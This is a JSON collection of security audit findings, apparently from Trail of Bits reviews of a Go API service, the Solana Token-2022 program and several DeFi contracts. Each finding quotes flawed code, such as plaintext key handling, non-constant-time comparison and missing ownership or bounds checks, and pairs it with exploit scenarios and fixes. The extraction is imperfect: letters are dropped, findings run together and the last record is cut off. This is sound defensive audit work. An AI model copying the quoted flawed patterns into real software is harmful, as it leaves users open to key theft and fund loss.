[{"title": "1. API keys are leaked outside of the application server ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf", "body": "API key verication is handled by the AuthKey function (gure 1.1). This function uses the auth method, which passes the plaintext value of a key to the database (as part of the database query), as shown in gure 1.2. func (s *CustomerStore) AuthKey(ctx context.Context, key string) (*clap.User, error) { internalUser, err := s.authInternalKey(ctx, key) if err == store.ErrInvalidAPIKey { return s.auth(ctx, \"auth_api_key\", key) } else if err != nil { return nil, err } return internalUser, nil } Figure 1.1: The call to the auth method (clap/internal/dbstore/customer.go#L73L82) func (s *CustomerStore) auth(ctx context.Context, funName string, value interface{}) (*clap.User, error) { user := &clap.User{ Type: clap.UserTypeCustomer, } err := s.db.QueryRowContext(ctx, fmt.Sprintf(` SELECT ws.sid, ws.workspace_id, ws.credential_id FROM console_clap.%s($1) AS ws LEFT JOIN api.disabled_user AS du ON du.user_id = ws.sid WHERE du.user_id IS NULL LIMIT 1 `, pq.QuoteIdentifier(funName)), value).Scan(&user.ID, &user.WorkspaceID, &user.CredentialID) ... } Figure 1.2: The database query, with an embedded plaintext key (clap/internal/dbstore/customer.go#L117L141) Moreover, keys are generated in the database (gure 1.3) rather than in the Go code and are then sent back to the API, which increases their exposure. gk := &store.GeneratedKey{} err = tx.QueryRowContext(ctx, ` SELECT sid, key FROM console_clap.key_request() `).Scan(&gk.CustomerID, &gk.Key) Figure 1.3: clap/internal/dbstore/customer.go#L50L53 Exploit Scenario An attacker gains access to connection trac between the application server and the database, steals the API keys being transmitted, and uses them to impersonate their owners. Recommendations Short term, have the API hash keys before sending them to the database, and generate API keys in the Go code. This will reduce the keys exposure. Long term, document the trust boundaries traversed by sensitive data.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "2. Unused insecure authentication mechanism ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf", "body": "The clap code contains an unused insecure authentication mechanism, the FixedKeyAuther strategy, that stores congured plaintext keys (gure 2.1) and veries them through a non-constant-time comparison (gure 2.2). The use of this comparison creates a timing attack risk. /* if cfg.Server.SickMode { if cfg.Server.ApiKey == \"\" { config\") log15.Crit(\"In sick mode, api key variable must be set in os.Exit(1) } auther = FixedKeyAuther{ ID: -1, Key: cfg.Server.ApiKey, } } else*/ Figure 2.1: clap/server/server.go#L57L67 type FixedKeyAuther struct { Key string ID int64 } func (a FixedKeyAuther) AuthKey(ctx context.Context, key string) (*clap.User, error) { if key != \"\" && key == a.Key { return &clap.User{ID: a.ID}, nil } return nil, nil } Figure 2.2: clap/server/auth.go#L19L29 Exploit Scenario The FixedKeyAuther strategy is enabled. This increases the risk of a key leak, since the authentication mechanism is vulnerable to timing attacks and stores plaintext API keys in memory. Recommendations Short term, to prevent API key exposure, either remove the FixedKeyAuther strategy or change it so that it uses a hash of the API key. Long term, avoid leaving commented-out or unused code in the codebase.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Use of panics to handle user-triggerable errors ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf", "body": "The clap HTTP handler mechanism uses panic to handle errors that can be triggered by users (gures 3.1 and 3.2). Handling these unusual cases of panics requires the mechanism to lter out errors of the RequestError type (gure 3.3). The use of panics to handle expected errors alters the panic semantics, deviates from callers expectations, and makes reasoning about the code and its error handling more dicult. func (r *Request) MustUnmarshal(v interface{}) { ... err := json.NewDecoder(body).Decode(v) if err != nil { panic(BadRequest(\"Failed to parse request body\", \"jsonErr\", err)) } } Figure 3.1: clap/lib/clap/request.go#L31L42 // MustBeAuthenticated returns user ID if request authenticated, // otherwise panics. func (r *Request) MustBeAuthenticated() User { user, err := r.User() if err == nil && user == nil { err = errors.New(\"user is nil\") } else if !user.Valid() { err = errors.New(\"user id is zero\") } if err != nil { panic(Error(\"not authenticated: \" + err.Error())) } return *user } Figure 3.2: clap/lib/clap/request.go#L134L147 defer func() { if e := recover(); e != nil { if err, ok := e.(*RequestError); ok { onError(w, r, err) } else { panic(e) } } }() Figure 3.3: clap/lib/clap/handler.go#L93L101 Recommendations Short term, change the code in gures 3.1, 3.2, and 3.3 so that it adheres to the conventions of handling expected errors in Go. This will simplify the error-handling functionality and the process of reasoning about the code. Reserving panics for unexpected situations or bugs in the code will also help surface incorrect assumptions. Long term, use panics only to handle unexpected errors.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "4. Confusing API authentication mechanism ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf", "body": "The clap HTTP endpoint handler code appears to indicate that the handlers perform manual endpoint authentication. This is because when a handler receives a clap.Request, it calls the MustBeAuthenticated method (gure 4.1). The name of this method could imply that it is called to authenticate the endpoint. However, MustBeAuthenticated returns information on the (already authenticated) user who submitted the request; authentication is actually performed by default by a centralized mechanism before the call to a handler. Thus, the use of this method could cause confusion regarding the timing of authentication. func (h *AlertsHandler) handleGet(r *clap.Request) interface{} { // Parse arguments q := r.URL.Query() var minSeverity uint64 if ms := q.Get(\"minSeverity\"); ms != \"\" { var err error minSeverity, err = strconv.ParseUint(ms, 10, 8) if err != nil || minSeverity > 5 { return clap.BadRequest(\"Invalid minSeverity parameter\") } } if h.MinSeverity > minSeverity { minSeverity = h.MinSeverity } filterEventType := q.Get(\"eventType\") user := r.MustBeAuthenticated() ... } Figure 4.1: clap/apiv1/alerts.go#L363L379 Recommendations Short term, add a ServeAuthenticatedAPI interface method that takes an additional user parameter indicating that the handler is already in the authenticated context. Long term, document the authentication system to make it easier for new team members and auditors to understand and to facilitate their onboarding.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. Use of MD5 can lead to lename collisions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf", "body": "When generating a lename, the deriveQueueFile function uses an unsafe MD5 hash function to hash the destinationID that is included in the lename (gure 5.1). func deriveQueueFile(outputType, destinationID string) string { return fmt.Sprintf(\"%s-%x.bdb\", outputType, md5.Sum([]byte(destinationID))) } Figure 5.1: ae/config/config.go#L284L286 Exploit Scenario An attacker with control of a destinationID value modies the value, with the goal of causing a hash collision. The hash computed by md5.Sum collides with that of an existing lename. As a result, the existing le is overwritten. Recommendations Short term, replace the MD5 function with a safer alternative such as SHA-2. Long term, avoid using the MD5 function unless it is necessary for interfacing with a legacy system in a non-security-related context.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Overly broad le permissions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf", "body": "In several parts of the ae code, les are created with overly broad permissions that allow them to be read by anyone in the system. This occurs in the following code paths:  ae/tools/copy.go#L50  ae/bqimport/import.go#L291  ae/tools/migrate.go#L127  ae/tools/migrate.go#L223  ae/tools/migrate.go#L197  ae/tools/copy.go#L16  ae/main.go#L319 Recommendations Short term, change the le permissions, limiting them to only those that are necessary. Long term, always consider the principle of least privilege when making decisions about le permissions.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Unhandled errors ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf", "body": "The gosec tool identied many unhandled errors in the ae and clap codebases. Recommendations Short term, run gosec on the ae and clap codebases, and address the unhandled errors. Even if an error is considered unimportant, it should still be handled and discarded, and the decision to discard it should be justied in a code comment. Long term, encourage the team to use gosec, and run it before any major release.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Ok returned for malformed extension data ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "In the get_extension_types function, if the account type-length-value (TLV) data is malformed and the TLV record data is truncated (i.e., the account data length is less than the start oset summed with the length of the TLV data), the function returns Ok rather than an error. fn get_extension_types (tlv_data: & [ u8 ]) -> Result < Vec <ExtensionType>, ProgramError> { let mut extension_types = vec! []; let mut start_index = 0 ; while start_index < tlv_data.len() { let tlv_indices = get_tlv_indices(start_index); if tlv_data.len() < tlv_indices.value_start { return Ok (extension_types); } Figure 1.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/mod.rs#L127-L134 Recommendations Short term, modify the get_extension_types function so that it returns an error if the TLV data is corrupt. This will ensure that the Token Program will not continue processing if the provided accounts extension data is corrupt.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "2. Missing account ownership checks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "Every account that the Token Program operates on should be owned by the Token Program, but several instructions lack account ownership checks. The functions lacking checks include process_reallocate , process_withdraw_withheld_tokens_from_mint , and process_withdraw_withheld_tokens_from_accounts . Many of these functions have an implicit check for this condition in that they modify the account data, which is possible only if the account is owned by the Token Program; however, future changes to the associated code could remove this protection. For example, in the process_withdraw_withheld_tokens_from_accounts instruction, neither the mint_account_info nor destination_account_info parameter is checked to ensure the account is owned by the Token Program. While the mint accounts data is mutably borrowed, the account data is never written. As a result, an attacker could pass a forged account in place of the mint account. Conversely, the destination_account_info accounts data is updated by the instruction, so it must be owned by the Token Program. However, if an attacker can nd a way to spoof an account public key that matches the mint property in the destination account, he could bypass the implicit check. Recommendations Short term, as a defense-in-depth measure, add explicit checks of account ownership for all accounts passed to instructions. This will both improve the clarity of the codebase and remove the dependence on implicit checks, which may no longer hold true when updates occur.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Medium"]}, {"title": "3. Use of a vulnerable dependency ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "Running the cargo audit command uncovered the use of one crate with a known vulnerability ( time ).  cargo audit Fetching advisory database from `https://github.com/RustSec/advisory-db.git` Loaded 458 security advisories (from /Users/andershelsing/.cargo/advisory-db) Updating crates.io index Scanning Cargo.lock for vulnerabilities (651 crate dependencies) Crate: time Version: 0.1.44 Title: Potential segfault in the time crate Date: 2020-11-18 ID: RUSTSEC-2020-0071 URL: https://rustsec.org/advisories/RUSTSEC-2020-0071 Solution: Upgrade to >=0.2.23 Figure 3.1: The result of running the cargo audit command Recommendations Short term, triage the use of the vulnerability in the time crate and upgrade the crate to a version in which the vulnerability is patched.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "4. Large extension sizes can cause panics ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "The call to try_from in the init_extension function returns an error if the length of the given extension is larger than u16::Max , which causes the unwrap operation to panic. let length = pod_get_packed_len::<V>(); *length_ref = Length::try_from(length).unwrap(); Figure 4.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/mod.rs#L493-L494 Recommendations Short term, add assertions to the program to catch extensions whose sizes are too large, and add relevant code to handle errors that could arise in the try_from function. This will ensure that the Token Program does not panic if any extension grows larger than u16::Max .", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "5. Unexpected function behavior ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "The decode_instruction_data function receives a byte slice representing the instruction data. Specically, the function expects the rst byte of the slice to contain the instruction type for an extension instruction; however, the function name does not clearly convey this intended behavior, and the behavior is not explained in code comments. /// Utility function for decoding instruction data pub fn decode_instruction_data <T: Pod >(input: & [ u8 ]) -> Result <&T, ProgramError> { if input.len() != pod_get_packed_len::<T>().saturating_add( 1 ) { Err (ProgramError::InvalidInstructionData) } else { pod_from_bytes( &input[ 1 ..] ) } } Figure 5.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/instruction.rs#L1761-L1768 Recommendations Short term, change the decode_instruction_data function so that it operates only on instruction data, and remove the instruction type from the data passed prior to the call. This will ensure that the functions name is in line with the functions operation.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "6. Out of bounds access in the get_extension instruction ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "The get_extension function instantiates a type from a TLV record. However, the get_extension_indices function does not check that the accounts data length is large enough for the value_end index. fn get_extension <S: BaseState , V: Extension >(tlv_data: &[u8]) -> Result <&V, ProgramError> { if V::TYPE.get_account_type() != S::ACCOUNT_TYPE { return Err (ProgramError::InvalidAccountData); } let TlvIndices { type_start: _ , length_start, value_start, } = get_extension_indices::<V>(tlv_data, false )?; // get_extension_indices has checked that tlv_data is long enough to include these indices let length = pod_from_bytes::<Length>(&tlv_data[length_start..value_start])?; let value_end = value_start.saturating_add(usize::from(*length)); pod_from_bytes::<V>(&tlv_data[ value_start..value_end ]) } Figure 6.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/mod.rs#L235-L248 Recommendations Short term, add a check to ensure that the TLV data for the account is large enough for the value_end index, and add relevant code to handle the error if it is not. This will ensure that the Token Program will not panic on accounts with truncated data.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "7. Iteration over empty data ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "The get_extension_indices function returns either the indices for a given extension type or the rst uninitialized slot. Because a TLV data record can never be deleted, the rst zero-value entry of the slice should indicate that the iteration has reached the end of the used data space. However, if the init parameter is false, the start_index index is advanced by two, and the iteration continues, presumably iterating over empty data until it reaches the end of the TLV data for the account. while start_index < tlv_data.len() { let tlv_indices = get_tlv_indices(start_index); if tlv_data.len() < tlv_indices.value_start { return Err (ProgramError::InvalidAccountData); } ... // got to an empty spot, can init here, or move forward if not initing if extension_type == ExtensionType::Uninitialized { if init { return Ok (tlv_indices); } else { start_index = tlv_indices.length_start; } } ... Figure 7.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/mod.rs#L96-L122 Recommendations Short term, modify the associated code so that it terminates the iteration when it reaches uninitialized data, which should indicate the end of the used TLV record data.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "8. Missing check in UpdateMint instruction could result in inoperable mints ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "If a mints auto_approve_new_accounts property is false , the ApproveAccount instruction needs the mints authority to sign transactions approving Accounts for the mint. However, issuing an update_mint instruction with the new authority set to Pubkey::default and the auto_approve_new_accounts property set to false would prevent Accounts from being approved. /// Processes an [UpdateMint] instruction. fn process_update_mint ( accounts: & [AccountInfo], new_confidential_transfer_mint: & ConfidentialTransferMint , ) -> ProgramResult { let account_info_iter = & mut accounts.iter(); let mint_info = next_account_info(account_info_iter)?; let authority_info = next_account_info(account_info_iter)?; let new_authority_info = next_account_info(account_info_iter)?; check_program_account(mint_info.owner)?; let mint_data = & mut mint_info.data.borrow_mut(); let mut mint = StateWithExtensionsMut::<Mint>::unpack(mint_data)?; let confidential_transfer_mint = mint.get_extension_mut::<ConfidentialTransferMint>()?; if authority_info.is_signer && confidential_transfer_mint.authority == *authority_info.key && (new_authority_info.is_signer || *new_authority_info.key == Pubkey::default() ) && new_confidential_transfer_mint.authority == *new_authority_info.key { *confidential_transfer_mint = *new_confidential_transfer_mint; Ok (()) } else { Err (ProgramError::MissingRequiredSignature) } } Figure 8.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/confidential_transfer/processor.rs#L64-L89 /// Processes an [ApproveAccount] instruction. fn process_approve_account (accounts: & [AccountInfo]) -> ProgramResult { let account_info_iter = & mut accounts.iter(); let token_account_info = next_account_info(account_info_iter)?; let mint_info = next_account_info(account_info_iter)?; let authority_info = next_account_info(account_info_iter)?; check_program_account(token_account_info.owner)?; let token_account_data = & mut token_account_info.data.borrow_mut(); let mut token_account = StateWithExtensionsMut::<Account>::unpack(token_account_data)?; check_program_account(mint_info.owner)?; let mint_data = &mint_info.data.borrow_mut(); let mint = StateWithExtensions::<Mint>::unpack(mint_data)?; let confidential_transfer_mint = mint.get_extension::<ConfidentialTransferMint>()?; if authority_info.is_signer && *authority_info.key == confidential_transfer_mint.authority { let mut confidential_transfer_state = token_account.get_extension_mut::<ConfidentialTransferAccount>()?; confidential_transfer_state.approved = true .into(); Ok (()) } else { Err (ProgramError::MissingRequiredSignature) } } Figure 8.2: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/confidential_transfer/processor.rs#L180-L204 Recommendations Short term, add a check to ensure that the auto_approve_new_accounts property is not false when the new authority is Pubkey::default . This will ensure that contract users cannot accidentally disable the authorization of accounts for mints.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "9. Incorrect test data description ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "The comments on the MINT_WITH_EXTENSION variable are incorrect. See gure 9.1 for the incorrect comments, highlighted in red, and the corrected comments, highlighted in yellow. const MINT_WITH_EXTENSION: & [ u8 ] = &[ // base mint 1 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , ]; 1 , 1 , 1 , 1 , 1 , 42 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 7 , 1 , 1 , 0 , 0 , 0 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , // padding 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , // account type 1 , // extension type <== really account type 3 , 0 , // length <== really extension type 32 , 0 , // data <== really extension length 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , <== really extension data Figure 9.1: https://github.com/solana-labs/solana-program-library/blob/50abadd819df2 e406567d6eca31c213264c1c7cd/token/program-2022/src/extension/mod.rs#L828 -L841 Recommendations Short term, update the comments to align with the data. This will ensure that developers working on the tests will not be confused by the data structure.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "10. The Transfer and TransferWithFee instructions are identical ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "The implementations of the Transfer and TransferWithFee instructions are identical. Whether fees are used is determined by whether the mint has a TransferFeeConfig extension, regardless of the instruction used. ConfidentialTransferInstruction::Transfer => { msg!( \"ConfidentialTransferInstruction::Transfer\" ); #[cfg(feature = \"zk-ops\" )] { let data = decode_instruction_data::<TransferInstructionData>(input)?; process_transfer( program_id, accounts, data.new_source_decryptable_available_balance, data.proof_instruction_offset as i64, ) } #[cfg(not(feature = \"zk-ops\" ))] Err (ProgramError::InvalidInstructionData) } ConfidentialTransferInstruction::TransferWithFee => { msg!( \"ConfidentialTransferInstruction::TransferWithFee\" ); #[cfg(feature = \"zk-ops\" )] { let data = decode_instruction_data::<TransferInstructionData>(input)?; process_transfer( program_id, accounts, data.new_source_decryptable_available_balance, data.proof_instruction_offset as i64, ) } #[cfg(not(feature = \"zk-ops\" ))] { Err (ProgramError::InvalidInstructionData) } } Figure 10.1: https://github.com/solana-labs/solana-program-library/blob/50abadd819df2 e406567d6eca31c213264c1c7cd/token/program-2022/src/extension/confidentia l_transfer/processor.rs#L1192-L1223 Recommendations Short term, deprecate the TransferWithFee instruction, and update the documentation for the Transfer instruction to clarify the use of fees. This will ensure that contract users will not be misled in how the instructions are performed.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "11. Some instructions operate only on the lo bits of balances ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "For condential transfers, the pending balance is split into lo and hi values: of the total 64 bits representing the value, lo contains the low 16 bits, and hi contains the high 48 bits. Some instructions seem to update only the lo bits. For example, the process_destination_for_transfer function updates only the pending_balance_lo eld of the destination_confidential_transfer_account account. Changing the ct_withdraw_withheld_tokens_from_accounts integration test so that the resulting fee is greater than u16::Max (and updating the test to account for other changes to account balances) breaks the test, which indicates that the pattern of updating only the lo bits is problematic. We found the same pattern in the process_withdraw_withheld_tokens_from_mint function for the destination_confidential_transfer_account account and in the process_withdraw_withheld_tokens_from_accounts function for the destination_confidential_transfer_account account. #[cfg(feature = \"zk-ops\" )] fn process_destination_for_transfer ( destination_token_account_info: & AccountInfo , mint_info: & AccountInfo , destination_encryption_pubkey: & EncryptionPubkey , destination_ciphertext_lo: & EncryptedBalance , destination_ciphertext_hi: & EncryptedBalance , encrypted_fee: Option <EncryptedFee>, ) -> ProgramResult { check_program_account(destination_token_account_info.owner)?; ... // subtract fee from destination pending balance let new_destination_pending_balance = ops::subtract( &destination_confidential_transfer_account.pending_balance_lo, &ciphertext_fee_destination, ) .ok_or(ProgramError::InvalidInstructionData)?; // add encrypted fee to current withheld fee let new_withheld_amount = ops::add( &destination_confidential_transfer_account.withheld_amount, &ciphertext_fee_withheld_authority, ) .ok_or(ProgramError::InvalidInstructionData)?; destination_confidential_transfer_account.pending_balance_lo = new_destination_pending_balance; destination_confidential_transfer_account.withheld_amount = new_withheld_amount; ... Figure 11.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/confidential_transfer/processor.rs#L761-L777 Recommendations Short term, investigate the security implications of operating only on the lo bits in operations and determine whether this pattern should be changed.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "12. Instruction susceptible to front-running ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "The code comments for the WithdrawWithheldTokensFromAccounts instruction state that the instruction is susceptible to front-running. The comments list two alternatives to the function HarvestWithheldTokensToMint and WithdrawWithheldTokensFromMint indicating that this vulnerable function could be deprecated. /// Transfer all withheld tokens to an account. Signed by the mint's withdraw withheld tokens /// authority. This instruction is susceptible to front-running. Use /// `HarvestWithheldTokensToMint` and `WithdrawWithheldTokensFromMint` as an alternative. /// /// Note on front-running: This instruction requires a zero-knowledge proof verification /// instruction that is checked with respect to the account state (the currently withheld /// fees). Suppose that a withdraw withheld authority generates the /// `WithdrawWithheldTokensFromAccounts` instruction along with a corresponding zero-knowledge /// proof for a specified set of accounts, and submits it on chain. If the withheld fees at any /// of the specified accounts change before the `WithdrawWithheldTokensFromAccounts` is /// executed on chain, the zero-knowledge proof will not verify with respect to the new state, /// forcing the transaction to fail. /// /// If front-running occurs, then users can look up the updated states of the accounts, /// generate a new zero-knowledge proof and try again. Alternatively, withdraw withheld /// authority can first move the withheld amount to the mint using /// `HarvestWithheldTokensToMint` and then move the withheld fees from mint to a specified /// destination account using `WithdrawWithheldTokensFromMint`. Figure 12.1: https://github.com/solana-labs/solana-program-library/blob/50abadd819df2 e406567d6eca31c213264c1c7cd/token/program-2022/src/extension/confidentia l_transfer/instruction.rs#L313-L330 Recommendations Short term, consider deprecating this instruction in favor of the alternatives suggested in the WithdrawWithheldTokensFromAccounts code comments, HarvestWithheldTokensToMint and WithdrawWithheldTokensFromMint . This will ensure that contract users who may have missed the comment describing the front-running vulnerability will not be exposed to the issue. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "1. Missing negative tests for several assertions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance3.pdf", "body": "The Paraspace protocol consists of numerous interacting components, and each operation is validated by checks that are widely dispersed throughout the codebase. Therefore, a robust suite of negative test cases is necessary to prevent vulnerabilities from being introduced if developers unwittingly remove or alter checks during development. However, a number of checks are present in the codebase without corresponding test cases. For example, the health factor check in the FlashClaimLogic contract is required in order to prevent users from extracting collateralized value from NFTs during ash claims, but there is no unit test to ensure this behavior. Commenting out the lines in gure 1.1 does not cause any test to fail. require( 86 87 88 89 ); healthFactor > DataTypes.HEALTH_FACTOR_LIQUIDATION_THRESHOLD, Errors.HEALTH_FACTOR_LOWER_THAN_LIQUIDATION_THRESHOLD Figure 1.1: FlashClaimLogic.sol#8689 A test that captures the desired behavior could, for example, initiate a ash claim of a BAYC NFT that is tied to collateralized staked APE (sAPE) and then withdraw the APE directly from the ApeCoinStaking contract, causing the accounts health factor to fall below 1. As another example, removing the following lines from the withdrawApeCoin function in the PoolApeStaking contract demonstrates that no negative test validates this functions logic. require( 73 74 75 76 ); nToken.ownerOf(_nfts[index].tokenId) == msg.sender, Errors.NOT_THE_OWNER Figure 1.2: PoolApeStaking.sol#73 Exploit Scenario Alice, a Paraspace developer, refactors the FlashClaimLogic contract and mistakenly omits the health factor check. Expecting the test suite to catch such errors, she commits the code, and the new version of the Paraspace contracts becomes vulnerable to undercollateralization attacks. Recommendations Short term, for each require statement in the codebase, ensure that at least one unit test fails when the assertion is removed. Long term, consider requiring that Paraspace developers ensure a minimum amount of unit test code coverage when they submit new pull requests to the Paraspace contracts, and that they provide justication for uncovered conditions. 2. Use of a magic constant with unclear meaning for the sAPE unstaking incentive Severity: Informational Diculty: High Type: Conguration Finding ID: TOB-PARASPACE-2 Target: contracts/protocol/tokenization/NTokenApeStaking.sol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Incorrect argument passed to _getPlatformOriginationFee ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The getOriginationFees function incorrectly uses msg.sender instead of the loan_ parameter. As a result, it returns an incorrect result to users who want to know how much a loan is paying in origination fees. function getOriginationFees(address loan_, uint256 principalRequested_) external view override returns (uint256 originationFees_) { originationFees_ = _getPlatformOriginationFee(msg.sender, principalRequested_) + delegateOriginationFee[msg.sender]; } Figure 1.1: getOriginationFees function (loan/contracts/MapleLoanFeeManager.sol#147-149) Exploit Scenario Bob, a borrower, wants to see how much his loan is paying in origination fees. He calls getOriginationFees but receives an incorrect result that does not correspond to what the loan actually pays. Recommendations Short term, correct the getOriginationFees function to use loan_ instead of msg.sender. Long term, add tests for view functions that are not used inside the protocol but are intended for the end-users.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "2. The protocol could stop working prematurely ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The _uint48 function is incorrectly implemented such that it requires the input to be less than or equal to type(uint32).max instead of type(uint48).max. This could lead to the incorrect reversion of successful executions. function _uint48(uint256 input_) internal pure returns (uint32 output_) { require(input_ <= type(uint32).max, \"LM:UINT32_CAST_OOB\"); output_ = uint32(input_); } Figure 2.1: _uint48 function (pool-v2/contracts/LoanManager.sol#774-777) The function is mainly used to keep track of when each loans payment starts and when it is due. All variables for which the result of _uint48 is assigned are eectively of uint48 type. Exploit Scenario The protocol stops working when we reach a block.timestamp value of type(uint32).max instead of the expected behavior to work until the block.timestamp reaches a value of type(uint48).max. Recommendations Short term, correct the _uint48 implementation by checking that the input_ is less than the type(uint48).max and that it returns an uint48 type. Long term, improve the unit-tests to account for extreme but valid states that the protocol supports. 3. Insu\u0000cient event generation Severity: Low Diculty: Low Type: Auditing and Logging Finding ID: TOB-MPL-3 Target: globals-v2/contracts/MapleGlobals.sol", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "4. Incorrect GovernorshipAccepted event argument ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The MapleGlobals contract emits the GovernorshipAccepted event with an incorrect previous owner value. MapleGlobals implements a two-step process for ownership transfer in which the current owner has to set the new governor, and then the new governor has to accept it. The acceptGovernor function rst sets the new governor with _setAddress and then emits the GovernorshipAccepted event with the rst argument dened as the old governor and the second the new one. However, because the admin() function returns the current value of the governor, both arguments will be the new governor. function acceptGovernor() external { require(msg.sender == pendingGovernor, \"MG:NOT_PENDING_GOVERNOR\"); _setAddress(ADMIN_SLOT, msg.sender); pendingGovernor = address(0); emit GovernorshipAccepted(admin(), msg.sender); } Figure 4.1: acceptGovernor function (globals-v2/contracts/MapleGlobals.sol#87-92) Exploit Scenario The Maple team decides to transfer the MapleGlobals governor to a new multi-signature wallet. The team has a script that veries the correct execution by checking the events emitted; however, this script creates a false alert because the GovernorshipAccepted event does not have the expected arguments. Recommendations Short term, emit the GovernorshipAccepted event before calling _setAddress. Long term, add tests to check the events have the expected arguments.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "5. Partially incorrect Chainlink price feed safety checks ", 